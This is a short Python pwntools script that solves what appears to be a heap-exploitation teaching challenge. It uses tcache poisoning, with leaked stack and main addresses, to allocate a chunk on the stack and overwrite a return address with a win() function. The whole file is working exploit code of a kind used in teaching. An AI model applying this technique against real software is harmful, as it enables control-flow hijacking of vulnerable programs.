#!/usr/bin/python3
from pwn import *
context.terminal = ['tmux', 'splitw', "-h"]
elf = context.binary = ELF("/babyheap_level11_teaching1")
libc = elf.libc
# Used tcache poisoning to redirect stack to win() function
# https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c
def start():
    if args.GDB:
        return gdb.debug(elf.path)
    else:
        return process(elf.path)

def malloc(index, size):
    io.clean()
    io.sendline("malloc")
    # size of string to malloc
    io.sendline(f"{index}")
    io.sendline(f"{size}")
    return index

def free(index):
    io.clean()
    io.sendline("free")
    io.sendline(f"{index}")

def puts(index):
    io.clean()
    io.sendline("puts")
    io.sendline(f"{index}")
    io.recvline()
    x = io.recvline()
    return x[x.find(b':'):]

def scanf(index, data):
    io.clean()
    io.sendline("scanf")
    io.sendline(f"{index}")
    io.sendline(data)

io = start()
# =====================================
io.recvuntil("[LEAK] ")
x = io.recvline()
stack_addr = x[x.find(b':')+2:-2].decode('utf-8')
log.info("[stack address]: "+stack_addr)
io.recvuntil("[LEAK] ")
x = io.recvline()
main = x[x.find(b':')+2:-2].decode('utf-8')
log.info("[main]: "+main)
# tcache poisoning the stack
# Allocating 2 buffers
a = malloc(0, 128)
b = malloc(1, 128)
free(a)
free(b)
# Now the tcache list has [ b -> a ]
# we know the info leak is $rbp - 0x110 but reverse engineering
scanf(b, p64(int(stack_addr, 16) + 0x118))
# Now the tcache list has [ b -> stack_addr ]
b = malloc(0, 128)
# Now the tcache list has [ stack_addr ]
c = malloc(1, 128)
offset = elf.sym['win'] - elf.sym['main']
scanf(c, pack(offset + int(main, 16)))
io.sendline('quit\n')
# =====================================
io.interactive()
